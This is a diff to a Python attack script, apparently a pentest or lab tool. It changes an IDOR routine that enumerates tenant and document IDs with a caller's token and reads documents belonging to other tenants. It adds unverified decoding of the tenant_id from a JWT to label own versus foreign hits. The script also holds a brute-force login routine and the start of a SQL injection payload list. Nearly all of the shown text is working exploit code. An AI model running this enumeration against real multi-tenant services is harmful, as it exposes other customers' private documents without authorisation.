@@ -103,7 +103,19 @@ def attack_brute_login(args):
     print("[-] Password not found in wordlist.")
 
 
+def _own_tenant_id(token):
+    """Best-effort read of the caller's own tenant_id from its token payload
+    (unverified - we're only using this to label results, not to attack)."""
+    try:
+        _, payload_b64, _ = token.split(".")
+        return json.loads(b64url_decode(payload_b64)).get("tenant_id")
+    except (ValueError, json.JSONDecodeError):
+        return None
+
+
 def attack_idor(args):
+    own_tenant = _own_tenant_id(args.token)
+    print(f"[*] Caller's own tenant (from token): {own_tenant}")
     print(f"[*] Enumerating tenants 0-{args.max_tenant} / docs 1-{args.max_doc} using caller's token ...")
     hits = []
     for tenant_id in range(0, args.max_tenant + 1):
@@ -115,11 +127,17 @@ def attack_idor(args):
             if resp.status_code == 200:
                 hits.append((tenant_id, doc_id, resp.json()))
 
-    print(f"[*] Accessible documents outside the caller's own tenant:")
+    foreign_hits = [h for h in hits if h[0] != own_tenant]
+
+    print("[*] Accessible documents:")
     for tenant_id, doc_id, doc in hits:
-        print(f"  tenant={tenant_id} doc={doc_id} -> {doc['title']}")
-    if hits:
-        print(f"[+] IDOR confirmed - read {len(hits)} document(s) via tenant IDs not owned by this token.")
+        tag = "(own tenant)" if tenant_id == own_tenant else "(FOREIGN tenant)"
+        print(f"  tenant={tenant_id} doc={doc_id} -> {doc['title']} {tag}")
+
+    if foreign_hits:
+        print(f"[+] IDOR confirmed - read {len(foreign_hits)} document(s) via tenant IDs not owned by this token.")
+    else:
+        print("[-] No documents accessible outside the caller's own tenant - tenant check appears enforced.")
 
 
 SQLI_PAYLOADS = [
